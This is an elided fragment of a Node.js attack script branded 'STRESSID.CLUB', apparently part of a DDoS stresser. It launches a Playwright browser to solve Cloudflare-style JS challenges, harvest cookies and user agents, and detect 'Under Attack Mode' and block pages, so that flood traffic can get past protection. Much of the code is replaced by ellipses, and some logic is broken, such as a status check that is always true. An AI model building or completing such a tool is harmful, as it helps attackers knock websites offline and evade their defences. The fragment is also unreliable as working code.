...
if (process.argv.length < 8) {
  console.log('\x1b[35m%s\x1b[0m', 'Owner script: HTTP BROWSER // method: STORM-EMULATION');
  ...
  async function addsession() {
    try {
      ...
      solving({
        ...
        console.log('[BROWSER] User-Agent: ' + random_ua + ' ');
        console.log('[BROWSER] Cookie: ' + myString + ' ');
    ...
    playwright.firefox.launch({
      ...
      try {
        ...
        if (checkstatus == "200") {
			...
			if (cookies) {
				resolve(cookies);
				console.log('Title: ' + ifdvestitovivod + ' // STRESSID.CLUB');
				browser.close();
				return;
			}
        }
        ...
        if (checkstatus == "503" || "403") {
			console.log('Found: [JS-Challenge] | [UAM] //STRESSID.CLUB');			
        }
		if (message.baloo == "true") {
			if (checkstatus == "403") {
				console.log('Found: [BALOO] | [BLOCKED] //STRESSID.CLUB');
				browser.close();
			}		
		}
      ...
      try {
        ...
        if (checkblockv2 == "Just a moment...") {
          console.log('Reload: [JS-Challenge] | [UAM] // STRESSID.CLUB');
          browser.close();
        }
